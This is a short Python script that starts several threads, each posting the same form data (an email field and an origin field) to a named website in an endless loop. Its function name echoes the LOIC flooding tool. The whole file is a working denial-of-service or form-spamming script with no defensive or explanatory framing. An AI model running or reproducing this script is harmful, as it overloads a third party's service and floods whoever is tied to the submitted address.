import requests
import threading

def auto_shlad(target):
    print("init auto_shlad: %s" % target)

    data = {
        'email': target,
        'origin':'djankgo'
    }

    while True:
        requests.post('http://www.shlad.io/', data)

def loic_shlad(threads, target):
    while threads > 0:
        threading.Thread(
            target=auto_shlad,
            args=[target],
        ).start()
        threads -= 1

if __name__ == "__main__":
    loic_shlad(4, 'shl@d')
